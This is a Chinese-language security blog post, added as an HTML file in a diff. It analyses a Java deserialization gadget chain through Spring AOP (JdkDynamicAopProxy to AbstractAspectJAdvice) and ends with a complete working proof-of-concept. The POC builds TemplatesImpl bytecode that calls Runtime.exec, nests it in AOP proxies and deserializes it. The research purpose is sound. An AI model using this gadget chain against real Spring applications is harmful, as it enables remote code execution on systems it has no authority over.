@@ -1,0 +1,488 @@
+
+<!DOCTYPE html>
+<html lang="en-us">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+    <title>SpringAOP链学习 | GSBP&#39;s Blog</title>
+    <meta name="description"
+        content="前言
+在浏览文章的时候看见有师傅发现了一条仅依赖于Springboot中的SpringAOP的链，于是自己调试学习了一下
+正文
+依赖于Spring-AOP和aspectjweaver两个包，但是springboot中的spring-boot-starter-aop自带包含这俩类，可以说是和Jackson一样通杀springboot的链子了
+流程
+调用链如下
+JdkDynamicAopProxy.invoke()-&gt;
+ReflectiveMethodInvocation.proceed()-&gt;
+AspectJAroundAdvice-&gt;invoke-&gt;
+org.springframework.aop.aspectj.AbstractAspectJAdvice.invokeAdviceMethod()-&gt;
+method.invoke()
+执行类是org.springframework.aop.aspectj.AbstractAspectJAdvice的invokeAdviceMethodWithGivenArgs方法
+![image-20250123020448769](/Users/gsbp/Library/Application Support/typora-user-images/image-20250123020448769.png)
+    protected Object invokeAdviceMethodWithGivenArgs(Object[] args) throws Throwable {
+        Object[] actualArgs = args;
+        if (this.aspectJAdviceMethod.getParameterCount() == 0) {
+            actualArgs = null;
+        }
+
+        try {
+            ReflectionUtils.makeAccessible(this.aspectJAdviceMethod);
+            return this.aspectJAdviceMethod.invoke(this.aspectInstanceFactory.getAspectInstance(), actualArgs);
+        } catch (IllegalArgumentException ex) {
+            throw new AopInvocationException(&#34;Mismatch on arguments to advice method [&#34; &#43; this.aspectJAdviceMethod &#43; &#34;]; pointcut expression [&#34; &#43; this.pointcut.getPointcutExpression() &#43; &#34;]&#34;, ex);
+        } catch (InvocationTargetException ex) {
+            throw ex.getTargetException();
+        }
+    }
+直接在AOP依赖下的一个sink点，有着反射执行任意方法的能力，操作空间很大">
+    <link rel="canonical" href="http://localhost:1313/post/springaop/" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bulma/0.7.4/css/bulma.min.css">
+    
+    <link rel="stylesheet" href="http://localhost:1313/scss/style.min.badf012c7f163854e3d9c3287a1df0863ae1974f62e123bbf1f2948b58ed39cf.css">
+
+    <meta property="og:url" content="http://localhost:1313/post/springaop/">
+  <meta property="og:site_name" content="GSBP&#39;s Blog">
+  <meta property="og:title" content="SpringAOP链学习">
+  <meta property="og:description" content="前言 在浏览文章的时候看见有师傅发现了一条仅依赖于Springboot中的SpringAOP的链，于是自己调试学习了一下
+正文 依赖于Spring-AOP和aspectjweaver两个包，但是springboot中的spring-boot-starter-aop自带包含这俩类，可以说是和Jackson一样通杀springboot的链子了
+流程 调用链如下
+JdkDynamicAopProxy.invoke()-&gt;ReflectiveMethodInvocation.proceed()-&gt;AspectJAroundAdvice-&gt;invoke-&gt;org.springframework.aop.aspectj.AbstractAspectJAdvice.invokeAdviceMethod()-&gt;method.invoke() 执行类是org.springframework.aop.aspectj.AbstractAspectJAdvice的invokeAdviceMethodWithGivenArgs方法
+![image-20250123020448769](/Users/gsbp/Library/Application Support/typora-user-images/image-20250123020448769.png)
+protected Object invokeAdviceMethodWithGivenArgs(Object[] args) throws Throwable {Object[] actualArgs = args;if (this.aspectJAdviceMethod.getParameterCount() == 0) {actualArgs = null;}try {ReflectionUtils.makeAccessible(this.aspectJAdviceMethod);return this.aspectJAdviceMethod.invoke(this.aspectInstanceFactory.getAspectInstance(), actualArgs);} catch (IllegalArgumentException ex) {throw new AopInvocationException(&#34;Mismatch on arguments to advice method [&#34; &#43; this.aspectJAdviceMethod &#43; &#34;]; pointcut expression [&#34; &#43; this.pointcut.getPointcutExpression() &#43; &#34;]&#34;, ex);} catch (InvocationTargetException ex) {throw ex.getTargetException();}} 直接在AOP依赖下的一个sink点，有着反射执行任意方法的能力，操作空间很大">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="post">
+    <meta property="article:published_time" content="2025-01-23T23:33:31+08:00">
+    <meta property="article:modified_time" content="2025-01-23T23:33:31+08:00">
+
+    
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="SpringAOP链学习">
+  <meta name="twitter:description" content="前言 在浏览文章的时候看见有师傅发现了一条仅依赖于Springboot中的SpringAOP的链，于是自己调试学习了一下
+正文 依赖于Spring-AOP和aspectjweaver两个包，但是springboot中的spring-boot-starter-aop自带包含这俩类，可以说是和Jackson一样通杀springboot的链子了
+流程 调用链如下
+JdkDynamicAopProxy.invoke()-&gt;ReflectiveMethodInvocation.proceed()-&gt;AspectJAroundAdvice-&gt;invoke-&gt;org.springframework.aop.aspectj.AbstractAspectJAdvice.invokeAdviceMethod()-&gt;method.invoke() 执行类是org.springframework.aop.aspectj.AbstractAspectJAdvice的invokeAdviceMethodWithGivenArgs方法
+![image-20250123020448769](/Users/gsbp/Library/Application Support/typora-user-images/image-20250123020448769.png)
+protected Object invokeAdviceMethodWithGivenArgs(Object[] args) throws Throwable {Object[] actualArgs = args;if (this.aspectJAdviceMethod.getParameterCount() == 0) {actualArgs = null;}try {ReflectionUtils.makeAccessible(this.aspectJAdviceMethod);return this.aspectJAdviceMethod.invoke(this.aspectInstanceFactory.getAspectInstance(), actualArgs);} catch (IllegalArgumentException ex) {throw new AopInvocationException(&#34;Mismatch on arguments to advice method [&#34; &#43; this.aspectJAdviceMethod &#43; &#34;]; pointcut expression [&#34; &#43; this.pointcut.getPointcutExpression() &#43; &#34;]&#34;, ex);} catch (InvocationTargetException ex) {throw ex.getTargetException();}} 直接在AOP依赖下的一个sink点，有着反射执行任意方法的能力，操作空间很大">
+
+    
+
+</head>
+<body><nav class="navbar is-light" role="navigation">
+    <div class="container">
+        <div class="navbar-brand">
+            <a href="/" title="home" class="navbar-item">
+                <span class="logo">
+                    <h1>GSBP&#39;s Blog</h1>
+                </span>
+            </a>
+
+            
+            <a id="theme-toggle" class="theme-toggle" href="#">
+                <img src="http://localhost:1313/svg/sun.svg" alt="sun icon" class="theme-icon" />
+            </a>
+
+            <a role="button" class="navbar-burger" aria-label="menu" aria-expanded="false">
+                <span aria-hidden="true"></span>
+                <span aria-hidden="true"></span>
+                <span aria-hidden="true"></span>
+            </a>
+        </div>
+
+        <div class="navbar-menu">
+            <div class="navbar-start">
+                
+                <a href="/about" class="navbar-item">About</a>
+                
+                <a href="/post" class="navbar-item">Blog</a>
+                
+                <a href="/categories" class="navbar-item">Categories</a>
+                
+                <a href="/friend" class="navbar-item">Friends</a>
+                
+            </div>
+
+        </div>
+        <div class="search">
+            <div id="fastSearch">
+                <input id="searchInput" tabindex="0" placeholder="Search..">
+                <ul id="searchResults">
+
+                </ul>
+            </div>
+            <a id="search-btn" style="display: inline-block;" href="# ">
+                <div class="icon-search"><svg class="search-svg" xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg></div>
+            </a>
+        </div>
+
+        <script src="/js/fuse.min.js"></script> 
+        <script src="/js/fastsearch.js"></script>
+
+    </div>
+</nav>
+
+<script>
+    
+    document.addEventListener('DOMContentLoaded', function() {
+        var burger = document.querySelector('.navbar-burger');
+        burger.addEventListener('click', function() {
+            burger.classList.toggle('is-active');
+            document.querySelector('.navbar-menu').classList.toggle('is-active');
+        });
+    });
+
+    
+    function setTheme(theme) {
+        let body = document.body;
+        let themeIcon = document.querySelector(".theme-icon");
+        if (theme === "dark") {
+            body.classList.add("dark-mode");
+            themeIcon.src = "http:\/\/localhost:1313\/svg/moon.svg";
+            themeIcon.alt = "moon icon";
+        } else {
+            body.classList.remove("dark-mode");
+            themeIcon.src = "http:\/\/localhost:1313\/svg/sun.svg";
+            themeIcon.alt = "sun icon";
+        }
+        
+        localStorage.setItem("theme", theme);
+    }
+
+    
+    let theme = localStorage.getItem("theme") || "light";
+    const isDarkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
+    if (isDarkMode) {
+        
+        setTheme('dark');
+
+    } else {
+        
+        setTheme('light');
+    }
+    setTheme(theme);
+
+    
+    document.getElementById("theme-toggle").addEventListener("click", function() {
+        if (theme === "light") {
+            theme = "dark";
+        } else {
+            theme = "light";
+        }
+        setTheme(theme);
+    });
+
+
+
+</script>
+
+</header><main>
+<div class="single-container">
+    <div class="archive">
+        <h1 class="title is-1">SpringAOP链学习</h1>
+        <div class="title subtitle heading is-6">
+            <div class="author-info columns is-vcentered">
+                <div class="column">
+                    <div class="columns is-vcentered is-mobile">
+                        
+                        <div class="column is-narrow">
+                            <img src="/img/GSBP.jpg" class="author-image">
+                        </div>
+                        
+                        <div class="column">
+                            <p>GSBP</p>
+                            <p><time>January 23, 2025</time>
+                            </p>
+                        </div>
+                    </div>
+                </div>
+                <div class="small-categories-container">
+                    <a href="/categories/java%E5%AE%89%E5%85%A8">Java安全</a>
+                </div>
+            </div>
+        </div>
+        <div class="content article-content">
+            <div class="toc-container">
+                
+    <div class="post-toc">
+        
+            <aside>
+                <button id="tocButton" ><h4 id="contents" style="margin-left: 1vw;color:rgb(96, 134, 180);margin-bottom: 0;">CONTENTS</h4></button>
+                <div id="hide"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#正文">正文</a>
+      <ul>
+        <li><a href="#流程">流程</a></li>
+        <li><a href="#构建payload中所需注意的">构建payload中所需注意的</a></li>
+      </ul>
+    </li>
+    <li><a href="#poc">POC</a></li>
+    <li><a href="#参考文章">参考文章</a></li>
+  </ul>
+</nav></div>
+            </aside>
+        
+    </div><script>
+    
+        let button = document.getElementById('tocButton');
+        let hide = document.getElementById("hide");
+        let contents=document.getElementById("contents");
+        button.addEventListener("click", function() {
+        if (hide.style.display!='block') {
+            hide.style.display='block'
+        } else {
+            hide.style.display='none'
+            contents.style.color='rgb(96, 134, 180)'
+        }
+        });
+    
+
+
+
+
+</script>
+            </div>
+            <h2 id="前言">前言</h2>
+<p>在浏览文章的时候看见有师傅发现了一条仅依赖于Springboot中的SpringAOP的链，于是自己调试学习了一下</p>
+<h2 id="正文">正文</h2>
+<p>依赖于Spring-AOP和aspectjweaver两个包，但是springboot中的spring-boot-starter-aop自带包含这俩类，可以说是和Jackson一样通杀springboot的链子了</p>
+<h3 id="流程">流程</h3>
+<p>调用链如下</p>
+<pre tabindex="0"><code>JdkDynamicAopProxy.invoke()-&gt;
+ReflectiveMethodInvocation.proceed()-&gt;
+AspectJAroundAdvice-&gt;invoke-&gt;
+org.springframework.aop.aspectj.AbstractAspectJAdvice.invokeAdviceMethod()-&gt;
+method.invoke()
+</code></pre><p>执行类是<code>org.springframework.aop.aspectj.AbstractAspectJAdvice</code>的<strong>invokeAdviceMethodWithGivenArgs</strong>方法</p>
+<p>![image-20250123020448769](/Users/gsbp/Library/Application Support/typora-user-images/image-20250123020448769.png)</p>
+<pre tabindex="0"><code>    protected Object invokeAdviceMethodWithGivenArgs(Object[] args) throws Throwable {
+        Object[] actualArgs = args;
+        if (this.aspectJAdviceMethod.getParameterCount() == 0) {
+            actualArgs = null;
+        }
+
+        try {
+            ReflectionUtils.makeAccessible(this.aspectJAdviceMethod);
+            return this.aspectJAdviceMethod.invoke(this.aspectInstanceFactory.getAspectInstance(), actualArgs);
+        } catch (IllegalArgumentException ex) {
+            throw new AopInvocationException(&#34;Mismatch on arguments to advice method [&#34; + this.aspectJAdviceMethod + &#34;]; pointcut expression [&#34; + this.pointcut.getPointcutExpression() + &#34;]&#34;, ex);
+        } catch (InvocationTargetException ex) {
+            throw ex.getTargetException();
+        }
+    }
+</code></pre><p>直接在AOP依赖下的一个sink点，有着反射执行任意方法的能力，操作空间很大</p>
+<p>在他的实现子类，在他的子类基本上invoke(before)方法的都调用了他的<code>invokeAdviceMethod</code>方法的，所以我们只需要找到一个方法能够调用invoke(before)即可</p>
+<p><img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250123021508701.png" alt="image-20250123021508701"></p>
+<p>然后下一步找到了<code>ReflectiveMethodInvocation</code>类,他的proceed就能够满足我们上面的要求</p>
+<p><img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250123021705034.png" alt="image-20250123021705034"></p>
+<p>接下来在<code>JdkDynamicAopProxy</code>的invoke方法将会调用proceed方法</p>
+<p><img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250123223723213.png" alt="image-20250123223723213"></p>
+<p>这里有一点很有趣，就是<code>ReflectiveMethodInvocation</code>类是没有实现serializable接口的，所以我们不能将这个类放进我们的writeObject里面，但是在<code>JdkDynamicAopProxy</code>直接帮我们new了一个新的出来,也是很巧了</p>
+<p>然后流程大致就是这样，接下来我们说一下payload执行中的一些知识点</p>
+<h3 id="构建payload中所需注意的">构建payload中所需注意的</h3>
+<p>触发JdkDynamicAopProxy的invoke方法有很多种操作方式了，从invoke的触发流程来看，下面这俩method是肯定触发不了这条链子的，会提前return导致我们想要执行的代码没执行到</p>
+<pre tabindex="0"><code>hashcode()
+equals()
+</code></pre><p>所以我们这里使用了平常非常常见的toString入口类</p>
+<p>上面流程的图片也看到了，如果要走到proceed方法那里，那首先还得过一下<code>chain.isEmpty()</code>这个判断</p>
+<p>chain由以下代码产生</p>
+<pre tabindex="0"><code>List&lt;Object&gt; chain = this.advised.getInterceptorsAndDynamicInterceptionAdvice(method, targetClass);
+</code></pre><pre tabindex="0"><code>    public List&lt;Object&gt; getInterceptorsAndDynamicInterceptionAdvice(Method method, @Nullable Class&lt;?&gt; targetClass) {
+        MethodCacheKey cacheKey = new MethodCacheKey(method);
+        List&lt;Object&gt; cached = (List)this.methodCache.get(cacheKey);
+        if (cached == null) {
+            cached = this.advisorChainFactory.getInterceptorsAndDynamicInterceptionAdvice(this, method, targetClass);
+            this.methodCache.put(cacheKey, cached);
+        }
+
+        return cached;
+    }
+</code></pre><p>因为<code>methodCache</code>由<code>transient</code>修饰，不能在反序列化中被恢复，所以这里的methodCache一开始一定为空，那我们就要看到<code>getInterceptorsAndDynamicInterceptionAdvice</code>方法了</p>
+<p><code>advisorChainFactory</code>对应的接口实现类只有<code>DefaultAdvisorChainFactory</code>，这里只能看看它的</p>
+<pre tabindex="0"><code>public List&lt;Object&gt; getInterceptorsAndDynamicInterceptionAdvice(Advised config, Method method, @Nullable Class&lt;?&gt; targetClass) {
+        AdvisorAdapterRegistry registry = GlobalAdvisorAdapterRegistry.getInstance();
+        Advisor[] advisors = config.getAdvisors();
+        List&lt;Object&gt; interceptorList = new ArrayList(advisors.length);
+        Class&lt;?&gt; actualClass = targetClass != null ? targetClass : method.getDeclaringClass();
+        Boolean hasIntroductions = null;
+
+        for(Advisor advisor : advisors) {
+            if (advisor instanceof PointcutAdvisor) {
+                PointcutAdvisor pointcutAdvisor = (PointcutAdvisor)advisor;
+                if (config.isPreFiltered() || pointcutAdvisor.getPointcut().getClassFilter().matches(actualClass)) {
+                    MethodMatcher mm = pointcutAdvisor.getPointcut().getMethodMatcher();
+                    boolean match;
+                    if (mm instanceof IntroductionAwareMethodMatcher) {
+                        if (hasIntroductions == null) {
+                            hasIntroductions = hasMatchingIntroductions(advisors, actualClass);
+                        }
+
+                        match = ((IntroductionAwareMethodMatcher)mm).matches(method, actualClass, hasIntroductions);
+                    } else {
+                        match = mm.matches(method, actualClass);
+                    }
+
+                    if (match) {
+                        MethodInterceptor[] interceptors = registry.getInterceptors(advisor);
+                        if (mm.isRuntime()) {
+                            for(MethodInterceptor interceptor : interceptors) {
+                                interceptorList.add(new InterceptorAndDynamicMethodMatcher(interceptor, mm));
+                            }
+                        } else {
+                            interceptorList.addAll(Arrays.asList(interceptors));
+                        }
+                    }
+                }
+            } else if (advisor instanceof IntroductionAdvisor) {
+                IntroductionAdvisor ia = (IntroductionAdvisor)advisor;
+                if (config.isPreFiltered() || ia.getClassFilter().matches(actualClass)) {
+                    Interceptor[] interceptors = registry.getInterceptors(advisor);
+                    interceptorList.addAll(Arrays.asList(interceptors));
+                }
+            } else {
+                Interceptor[] interceptors = registry.getInterceptors(advisor);
+                interceptorList.addAll(Arrays.asList(interceptors));
+            }
+        }
+
+        return interceptorList;
+    }
+</code></pre><p>我们可以发现，不管是那种方式添加进入<code>interceptorList</code>的，其所对应的成员往往是从<code>registry.getInterceptors(advisor);</code>来的</p>
+<p>那这里我们顺藤摸瓜,registry所对应的类是<code>DefaultAdvisorAdapterRegistry</code></p>
+<p><img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250123225810812.png" alt="image-20250123225810812"></p>
+<p>对应的getInterceptors代码如下</p>
+<p><img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250123225924866.png" alt="image-20250123225924866"></p>
+<p>那这里我们只有从第一个判断口进入才能够添加interceptors，不过要求是我们的advisor必须实现了MethodInterceotor接口,简单看了一下继承关系，和文章师傅里得出的结论一样：没有同时实现了该接口的advisor类</p>
+<p>面对此种情况，我们使用了动态代理去将<code>MethodInterceotor</code>给advisor类代理上，使其实现双接口</p>
+<p>这里又用到了一次<code>JdkDynamicAopProxy</code>,不过和前面的作用完全不同</p>
+<p>然后这里就能够顺利return回我们想要的interceptors,chain也能执行到我们的proceed方法了</p>
+<p>最后就是在我们的<code>org.springframework.aop.aspectj.AbstractAspectJAdvice.invokeAdviceMethodWithGivenArgs</code>中</p>
+<pre tabindex="0"><code>this.aspectJAdviceMethod.invoke(this.aspectInstanceFactory.getAspectInstance(), actualArgs);
+</code></pre><p>这里还要从aspectInstanceFactory中获取到一个方法类的实例,文章中是使用了<code>SingletonAspectInstanceFactory</code>这个类</p>
+<p><img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250123232655590.png" alt="image-20250123232655590"></p>
+<p>和CC里的ConstantTransformer很相似</p>
+<h2 id="poc">POC</h2>
+<pre tabindex="0"><code>
+import Utils.Util;
+import com.fasterxml.jackson.databind.node.POJONode;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import javassist.ClassPool;
+import javassist.CtClass;
+import javassist.CtConstructor;
+import org.aopalliance.aop.Advice;
+import org.aopalliance.intercept.MethodInterceptor;
+import org.springframework.aop.aspectj.AbstractAspectJAdvice;
+import org.springframework.aop.aspectj.AspectJAroundAdvice;
+import org.springframework.aop.aspectj.AspectJExpressionPointcut;
+import org.springframework.aop.aspectj.SingletonAspectInstanceFactory;
+import org.springframework.aop.framework.AdvisedSupport;
+import org.springframework.aop.support.DefaultIntroductionAdvisor;
+import org.springframework.core.Ordered;
+
+import java.lang.reflect.*;
+import java.util.PriorityQueue;
+
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+
+import javax.management.BadAttributeValueExpException;
+import javax.xml.transform.Templates;
+
+public class main {
+    public static void main(String[] args) throws Exception {
+
+
+        ClassPool pool = ClassPool.getDefault();
+        CtClass clazz = pool.makeClass(&#34;a&#34;);
+        CtClass superClass = pool.get(AbstractTranslet.class.getName());
+        clazz.setSuperclass(superClass);
+        CtConstructor constructor = new CtConstructor(new CtClass[]{}, clazz);
+        constructor.setBody(&#34;Runtime.getRuntime().exec(\&#34;open -na Calculator\&#34;);&#34;);
+        clazz.addConstructor(constructor);
+        byte[][] bytes = new byte[][]{clazz.toBytecode()};
+        TemplatesImpl templates = TemplatesImpl.class.newInstance();
+        Util.setFieldValue(templates, &#34;_bytecodes&#34;, bytes);
+        Util.setFieldValue(templates, &#34;_name&#34;, &#34;GSBP&#34;);
+        Util.setFieldValue(templates, &#34;_tfactory&#34;, null);
+        Method method=templates.getClass().getMethod(&#34;newTransformer&#34;);//获取newTransformer方法
+
+        SingletonAspectInstanceFactory factory = new SingletonAspectInstanceFactory(templates);
+        AspectJAroundAdvice advice = new AspectJAroundAdvice(method,new AspectJExpressionPointcut(),factory);
+        Proxy proxy1 = (Proxy) getAProxy(advice,Advice.class);
+
+        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(123);
+        Util.setFieldValue(badAttributeValueExpException, &#34;val&#34;, proxy1);
+        Util.deserialize(Util.serialize(badAttributeValueExpException));
+
+    }
+    public static Object getBProxy(Object obj,Class[] clazzs) throws Exception
+    {
+        AdvisedSupport advisedSupport = new AdvisedSupport();
+        advisedSupport.setTarget(obj);
+        Constructor constructor = Class.forName(&#34;org.springframework.aop.framework.JdkDynamicAopProxy&#34;).getConstructor(AdvisedSupport.class);
+        constructor.setAccessible(true);
+        InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);
+        Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), clazzs, handler);
+        return proxy;
+    }
+    public static Object getAProxy(Object obj,Class&lt;?&gt; clazz) throws Exception
+    {
+        AdvisedSupport advisedSupport = new AdvisedSupport();
+        advisedSupport.setTarget(obj);
+        AbstractAspectJAdvice advice = (AbstractAspectJAdvice) obj;
+
+        DefaultIntroductionAdvisor advisor = new DefaultIntroductionAdvisor((Advice) getBProxy(advice, new Class[]{MethodInterceptor.class, Advice.class}));
+        advisedSupport.addAdvisor(advisor);
+        Constructor constructor = Class.forName(&#34;org.springframework.aop.framework.JdkDynamicAopProxy&#34;).getConstructor(AdvisedSupport.class);
+        constructor.setAccessible(true);
+        InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);
+        Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{clazz}, handler);
+        return proxy;
+    }
+
+}
+</code></pre><p><img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250123233035882.png" alt="image-20250123233035882"></p>
+<h2 id="参考文章">参考文章</h2>
+<p><a href="https://mp.weixin.qq.com/s/oQ1mFohc332v8U1yA7RaMQ">https://mp.weixin.qq.com/s/oQ1mFohc332v8U1yA7RaMQ</a></p>
+
+        </div>
+    </div>
+    <a href="#" id="scrollToTopButton">
+        <svg t="1686753152588" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg"
+            p-id="3988" width="48" height="48">
+            <path
+                d="M518.5 360.3c-3.2-4.4-9.7-4.4-12.9 0l-178 246c-3.8 5.3 0 12.7 6.5 12.7H381c10.2 0 19.9-4.9 25.9-13.2L512 460.4l105.2 145.4c6 8.3 15.6 13.2 25.9 13.2H690c6.5 0 10.3-7.4 6.5-12.7l-178-246z"
+                p-id="3989" fill="#363636"></path>
+            <path
+                d="M512 64C264.6 64 64 264.6 64 512s200.6 448 448 448 448-200.6 448-448S759.4 64 512 64z m0 820c-205.4 0-372-166.6-372-372s166.6-372 372-372 372 166.6 372 372-166.6 372-372 372z"
+                p-id="3990" fill="#363636"></path>
+        </svg>
+    </a>
+
+<div class="pp-container">
+        <section class="pre-and-post">
+            <div class="has-text-left">
+                
+                <p>Previous post</p>
+                <a href="http://localhost:1313/post/jdk17%E6%89%93jackson&#43;ldapattruibute%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">JDK17打Jackson&#43;LdapAttruibute反序列化</a>
+                
+            </div>
+            <div class="has-text-right">
+                
+            </div>
+        </section>
+    </div>
+
+</div>
+
+        </main><footer class="footer">
+    <div class="content has-text-centered">
+    <span>&copy; 2025 <a href="http://localhost:1313/">GSBP&#39;s Blog</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" target="_blank">Hugo</a> &
+        <a href="https://github.com/hotjuicew/hugo-JuiceBar" target="_blank">JuiceBar</a>
+    </span>
+    </div>
+  </footer></body>
+</html>
+
